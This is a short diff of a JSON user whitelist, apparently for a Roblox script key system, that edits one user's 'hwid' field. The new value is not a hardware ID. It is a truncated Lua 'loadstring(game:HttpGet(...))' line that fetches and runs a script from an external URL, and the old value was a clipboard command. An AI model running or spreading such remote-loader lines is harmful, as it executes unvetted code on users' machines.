@@ -35,7 +35,7 @@
         "role": "Booster"
     },
     "1122479417281740892": {
-        "hwid": "SETCLIPBOARD(GAME:GETSERVICE('RBXANALYTICSSERVICE'):GETCLIENTID())",
+        "hwid": "LOADSTRING(GAME:HTTPGET(\"HTTPS://API.JNKIE.COM/API/V1/LUASCRIPTS/PUBLIC/3FE42C8BB513805FF3C69F93F484",
         "username": "desiredslow",
         "role": "Premium"
     },
